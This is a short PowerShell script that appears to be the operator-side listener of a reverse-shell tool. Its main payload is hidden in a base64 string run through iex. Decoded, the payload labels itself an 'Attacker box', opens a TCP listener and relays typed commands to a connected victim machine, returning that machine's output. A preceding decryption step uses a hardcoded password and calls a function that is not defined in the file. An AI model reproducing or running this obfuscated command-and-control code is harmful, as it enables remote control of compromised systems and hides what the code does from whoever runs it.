#Listener

$cipherText = [byte[]] (Get-Content -Path "C:\ciphertext.bin" -Encoding Byte)
$password = "mypassword"
$salt = [byte[]] (Get-Content -Path "C:\salt.bin" -Encoding Byte)
$iterations = 100

$plainText = Decrypt-AES128_CBC_PKCS7_PBKDF2 -cipherText $cipherText -password $password -salt $salt -iterations $iterations

Write-Output $plainText

$encoded = "I3RoaXMgaXMgYSBwb3dlcnNoZWxsIC0gQ2xpZW50IC0gQXR0YWNrZXIgYm94CiMgRGVmaW5lIHRoZSBJUCBhZGRyZXNzIGFuZCBwb3J0IG51bWJlciB0byBsaXN0ZW4gb24KJGlwID0gIjEyNy4wLjAuMSIKJHBvcnQgPSAiODA4MCIKCiMgQ3JlYXRlIGEgbmV3IFRDUCBsaXN0ZW5lciBvbiB0aGUgc3BlY2lmaWVkIElQIGFuZCBwb3J0CiRzb2NrZXQgPSBuZXctb2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UY3BMaXN0ZW5lcigkaXAsICRwb3J0KTsKCiMgSWYgdGhlIGxpc3RlbmVyIGlzIG51bGwsIGV4aXQgdGhlIHNjcmlwdAppZigkc29ja2V0IC1lcSAkbnVsbCl7CiAgICBleGl0IDEKfQoKIyBTdGFydCB0aGUgbGlzdGVuZXIKJHNvY2tldC5zdGFydCgpCgojIFdhaXQgZm9yIGEgY2xpZW50IHRvIGNvbm5lY3QKJGNsaWVudCA9ICRzb2NrZXQuQWNjZXB0VGNwQ2xpZW50KCkKCiMgT3V0cHV0IGEgbWVzc2FnZSB0byBpbmRpY2F0ZSB0aGF0IGEgY29ubmVjdGlvbiBoYXMgYmVlbiBlc3RhYmxpc2hlZAp3cml0ZS1vdXRwdXQgIlsqXSBDb25uZWN0aW9uISIKCiMgR2V0IHRoZSBzdHJlYW0gZnJvbSB0aGUgY2xpZW50CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwoKIyBDcmVhdGUgYSBzdHJlYW0gd3JpdGVyIHRvIHdyaXRlIHRvIHRoZSBzdHJlYW0KJHdyaXRlciA9IG5ldy1vYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3RyZWFtKTsKCiMgQ3JlYXRlIGEgYnVmZmVyIHRvIHN0b3JlIGRhdGEgcmVjZWl2ZWQgZnJvbSB0aGUgY2xpZW50CiRidWZmZXIgPSBuZXctb2JqZWN0IFN5c3RlbS5CeXRlW10gMjA0ODsKCiMgQ3JlYXRlIGFuIEFTQ0lJIGVuY29kaW5nIG9iamVjdAokZW5jb2RpbmcgPSBuZXctb2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2Rpbmc7CgojIExvb3AgdW50aWwgdGhlIGNsaWVudCBkaXNjb25uZWN0cwpkbwp7CiAgICAjIFJlYWQgYSBjb21tYW5kIGZyb20gdGhlIGNvbnNvbGUKICAgICRjbWQgPSByZWFkLWhvc3QKCiAgICAjIFdyaXRlIHRoZSBjb21tYW5kIHRvIHRoZSBzdHJlYW0KICAgICR3cml0ZXIuV3JpdGVMaW5lKCRjbWQpCiAgICAkd3JpdGVyLkZsdXNoKCk7CgogICAgIyBJZiB0aGUgY29tbWFuZCBpcyAiZXhpdCIsIGJyZWFrIG91dCBvZiB0aGUgbG9vcAogICAgaWYoJGNtZCAtZXEgImV4aXQiKXsKICAgICAgICBicmVhawogICAgfQoKICAgICMgUmVhZCB0aGUgcmVzcG9uc2UgZnJvbSB0aGUgY2xpZW50CiAgICAkcmVhZCA9ICRudWxsOwogICAgd2hpbGUoJHN0cmVhbS5EYXRhQXZhaWxhYmxlIC1vciAkcmVhZCAtZXEgJG51bGwpIHsKICAgICAgICAkcmVhZCA9ICRzdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAyMDQ4KQogICAgICAgICRvdXQgPSAkZW5jb2RpbmcuR2V0U3RyaW5nKCRidWZmZXIsIDAsICRyZWFkKQogICAgICAgIFdyaXRlLU91dHB1dCAkb3V0CiAgICB9CgojIENvbnRpbnVlIHRoZSBsb29wIGFzIGxvbmcgYXMgdGhlIGNsaWVudCBpcyBjb25uZWN0ZWQKfSBXaGlsZSAoJGNsaWVudC5Db25uZWN0ZWQgLWVxICR0cnVlKQoKIyBTdG9wIHRoZSBsaXN0ZW5lcgokc29ja2V0LlN0b3AoKQoKIyBDbG9zZSB0aGUgY2xpZW50IGFuZCBzdHJlYW0KJGNsaWVudC5jbG9zZSgpOwokc3RyZWFtLkRpc3Bvc2UoKQ=="
$unencoded = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($encoded))
iex $unencoded
